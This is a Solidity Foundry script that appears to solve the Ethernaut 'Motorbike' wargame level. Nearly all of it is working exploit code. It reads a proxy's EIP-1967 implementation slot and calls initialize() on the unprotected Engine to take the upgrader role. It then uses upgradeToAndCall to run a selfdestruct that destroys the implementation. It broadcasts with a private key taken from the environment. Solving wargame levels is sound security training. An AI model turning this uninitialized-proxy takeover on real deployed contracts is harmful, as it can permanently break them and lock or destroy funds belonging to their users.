// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Level25.sol";

contract Level25Sol is Script {
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    Motorbike instance = Motorbike(0x20072a9B2075f613965e9AE956de56E2d68A45B2);

    Engine engineAddress =
        Engine(
            address(
                uint160(
                    uint256(vm.load(address(instance), _IMPLEMENTATION_SLOT))
                )
            )
        );

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log(address(engineAddress));
        new Attack().exploit(address(engineAddress));

        vm.stopBroadcast();
    }
}

contract Attack {
    Engine public engine;

    function exploit(address _engine) public {
        engine = Engine(_engine);

        engine.initialize();

        console.log(engine.upgrader());

        bytes memory killSelector = abi.encodeWithSelector(this.kill.selector);

        engine.upgradeToAndCall(address(this), killSelector);
    }

    function kill() external {
        selfdestruct(payable(address(this)));
    }

    receive() external payable {}
}
